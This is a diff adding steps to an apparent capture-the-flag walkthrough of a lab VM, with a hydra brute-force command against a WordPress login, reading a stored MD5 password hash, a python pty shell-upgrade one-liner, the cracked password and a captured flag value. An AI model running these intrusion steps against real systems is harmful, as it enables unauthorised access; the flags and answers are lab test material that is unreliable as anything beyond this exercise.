@@ -57,3 +57,31 @@ hydra -vV -l elliot -P userdic.txt 192.168.56.103 http-post-form '/wp-login.php:
 Output:
 [80][http-post-form] host: 192.168.56.103   login: elliot   password: ER28-0652
 
+4. Access to the admin shell through nc and php script
+
+daemon@linux:/home/robot$ cat password.raw-md5
+cat password.raw-md5
+robot:c3fcd3d76192e4007dfb496cca67e13b
+
+ also had error:
+
+daemon@linux:/home/robot$ sudo su                        
+sudo su
+sudo: no tty present and no askpass program specified
+
+ 
+ fix it:
+
+python -c 'import pty; pty.spawn("/bin/sh")'
+
+
+ hash -> password
+
+abcdefghijklmnopqrstuvwxyz
+
+5. flag-2
+
+robot@linux:~$ cat key-2-of-3.txt
+cat key-2-of-3.txt
+822c73956184f694993bede3eb39f959
+
